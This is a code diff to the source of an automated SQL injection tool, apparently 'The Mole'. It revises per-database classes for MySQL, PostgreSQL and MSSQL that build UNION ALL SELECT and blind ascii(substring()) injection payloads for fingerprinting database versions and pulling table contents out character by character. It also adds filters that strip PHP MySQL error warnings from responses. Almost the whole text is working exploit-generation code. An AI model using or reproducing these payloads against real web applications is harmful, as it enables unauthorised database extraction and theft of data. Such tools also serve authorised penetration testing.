@@ -27,12 +27,23 @@ import re
 class DbmsMole():
     field_finger_str = 'The_Mole.F1nger!'
     error_strings = [
-                        "Error: Unknown column '(\d*)' in 'order clause'",
+                        "Error: Unknown column '(\d+)' in 'order clause'",
                         "SQLSTATE\[\d+\]"
+                    ]
+                    
+    error_filters = [
+                        re.compile("<br />\n<b>Warning</b>:  mysql_fetch_array\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
+                        re.compile("<br />\n<b>Warning</b>:  mysql_num_rows\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
                     ]
     
     def injectable_field_fingers(cls, query_columns, base):
         pass
+    
+    @classmethod
+    def remove_errors(cls, data):
+        for i in DbmsMole.error_filters:
+            data = i.sub('', data)
+        return data
     
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
@@ -88,13 +99,13 @@ class DbmsMole():
         pass
         
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
+        return ' and {par}' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
+        return ' and {par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'
 
     def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
+        return ' and {par}' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
         
     def schema_count_query(self, columns, injectable_field):
         return self.forge_query(columns, "count(*)", 
@@ -313,26 +324,26 @@ class Mysql5Mole(DbmsMole):
     
     @classmethod
     def field_finger_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
         query_list[injectable_field] = DbmsMole.to_hex(DbmsMole.field_finger_str)
-        query += ",".join(query_list) + " {com}"
+        query += ",".join(query_list)
         return query
     
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
         query_list[injectable_field] = "CONCAT({fing},@@version,{fing})".format(fing=Mysql5Mole.out_delimiter)
-        query += ",".join(query_list) + " {com}"
+        query += ",".join(query_list) + " "
         return query
 
     @classmethod
     def dbms_check_blind_query(cls):
-        return '{sep} and 0 < (select length(@@version)) {end}'
+        return ' and 0 < (select length(@@version)) '
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = "{sep}{par} and 1=0 UNION ALL SELECT "
+        query = " and 1=0 UNION ALL SELECT "
         query_list = list(map(str, range(column_count)))
         query_list[injectable_field] = ("CONCAT(" +
                                             Mysql5Mole.out_delimiter +
@@ -344,7 +355,7 @@ class Mysql5Mole(DbmsMole):
                                         ")")
         query += ','.join(query_list)
         query += " from " + table_name + " where " + self.parse_condition(where) + \
-                 " limit 1 offset " + str(offset) + "{com}"
+                 " limit 1 offset " + str(offset) + " "
         return query
 
     def parse_results(self, url_data):
@@ -414,10 +425,10 @@ class PostgresMole(DbmsMole):
     
     @classmethod
     def dbms_check_blind_query(cls):
-        return '{sep} and 0 < (select length(getpgusername())) {end}'
+        return ' and {par}0 < (select length(getpgusername()))'
     
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = []
         for i in range(column_count):
             query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
@@ -427,7 +438,7 @@ class PostgresMole(DbmsMole):
                                         )
         query += ','.join(query_list)
         query += " from " + table_name + " where " + self.parse_condition(where) + \
-                 " limit 1 offset " + str(offset) + "{com}"
+                 " limit 1 offset " + str(offset)
         return query
     
     @classmethod
@@ -441,12 +452,12 @@ class PostgresMole(DbmsMole):
     
     @classmethod
     def field_finger_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1=0 UNION ALL SELECT "
+        query = " and 1=0 UNION ALL SELECT "
         query_list = []
         for i in range(columns):
             query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
         query_list[injectable_field] = "(" + DbmsMole.chr_join(DbmsMole.field_finger_str) + ")::unknown"
-        query += ",".join(query_list) + " {com}"
+        query += ",".join(query_list)
         return query
 
     @classmethod
@@ -520,17 +531,17 @@ class MssqlMole(DbmsMole):
 
 
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
-        return ('{sep} and ' + (str(value) + ' < (select top 1 ascii(substring({fields}, '+str(index)+', 1)) from ' + 
+        return (' and {par}' + (str(value) + ' < (select top 1 ascii(substring({fields}, '+str(index)+', 1)) from ' + 
                '{table} where {where} and {fields} not in (select top {off} {fields} from {table} where {where}))').format(
-                    table=table, fields=fields, where=where, off=offset) + '{end}'
+                    table=table, fields=fields, where=self.parse_condition(where), off=offset)
                 )
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
+        return ' and {par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'
 
     def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
-        return ('{sep} and ' + (str(value) + ' ' + operator + ' (select top 1 len({field}) from {table} where ' + 
-                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=field,where=where,off=offset) + '{end}')
+        return (' and {par}' + (str(value) + ' ' + operator + ' (select top 1 len({field}) from {table} where ' + 
+                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=field,where=self.parse_condition(where),off=offset))
 
     @classmethod
     def blind_field_delimiter(cls):
@@ -538,7 +549,7 @@ class MssqlMole(DbmsMole):
 
     @classmethod
     def dbms_check_blind_query(cls):
-        return '{sep} and 0 < (select len(user_name())) {end}'
+        return ' and {par}0 < (select len(user_name()))'
 
     @classmethod
     def dbms_name(cls):
@@ -558,30 +569,39 @@ class MssqlMole(DbmsMole):
             output.append((list(hashes), to_search))
             hashes[i] = DbmsMole.char_concat(str(base + i))
             output.append((hashes, to_search))
+        hashes = []
+        for i in range(base, base + query_columns):
+            hashes.append(DbmsMole.char_concat(str(i)))
+        to_search = list(map(str, range(base, base + query_columns)))
+        output.append((list(hashes), to_search))
+        hashes = []
+        for i in range(base, base + query_columns):
+            hashes.append(str(i))
+        output.append((list(hashes), to_search))
         return output
 
     @classmethod
     def field_finger_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1=0 UNION ALL SELECT "
+        query = " and 1=0 UNION ALL SELECT "
         query_list = list(map(lambda x: 'null', range(columns)))
         query_list[injectable_field] = DbmsMole.char_concat(DbmsMole.field_finger_str)
-        query += ",".join(query_list) + " {com}"
+        query += ",".join(query_list)
         return query
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT TOP 1 "
+        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
         query_list = list(map(lambda x: 'null', range(column_count)))
         if fields == 'count(*)':
             query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(count(*) as varchar(50))+' + MssqlMole.out_delimiter)
             query += ','.join(query_list)
-            return query + " from " + table_name + " where " + self.parse_condition(where) + "{com}"
+            return query + " from " + table_name + " where " + self.parse_condition(where)
         fields = self._concat_fields(fields.split(','))
         query_list[injectable_field] = (MssqlMole.out_delimiter + "+" + fields + "+" + MssqlMole.out_delimiter)
         where = self.parse_condition(where)
         query += ','.join(query_list)
         query += (" from " + table_name + " where " + fields +  " not in (select top " + 
                   str(offset) + " " + fields + " from " + table_name + " where " + where + ") and ")
-        query += where + " {com}"
+        query += where
         return query
 
     def _concat_fields(self, fields):
@@ -589,10 +609,10 @@ class MssqlMole(DbmsMole):
 
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
-        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
+        query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(lambda x: 'null', range(columns)))
         query_list[injectable_field] = "{fing}+@@version+{fing}".format(fing=MssqlMole.out_delimiter)
-        query += ",".join(query_list) + " {com}"
+        query += ",".join(query_list)
         return query
 
     def parse_results(self, url_data):
